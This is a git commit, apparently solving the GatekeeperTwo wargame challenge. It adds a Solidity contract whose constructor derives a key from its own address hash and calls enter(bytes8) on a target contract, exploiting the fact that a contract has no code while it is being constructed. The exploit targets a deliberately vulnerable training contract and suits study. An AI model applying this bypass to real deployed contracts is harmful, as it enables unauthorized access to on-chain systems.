4d51011c97cc67665567ab568c72eccd6d62e701
Matthew Peterson <84740085+mcp001@users.noreply.github.com>
2022-02-03 20:37:56 -0600

    First commit

---
+++ GatekeeperTwoAttack.sol
@@ -0,0 +1,9 @@
+pragma solidity ^0.6.0;
+
+contract GatekeeperTwoAttack {
+
+    constructor(address _addr) public {
+        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
+        _addr.call(abi.encodeWithSignature('enter(bytes8)', _key));
+    }
+}
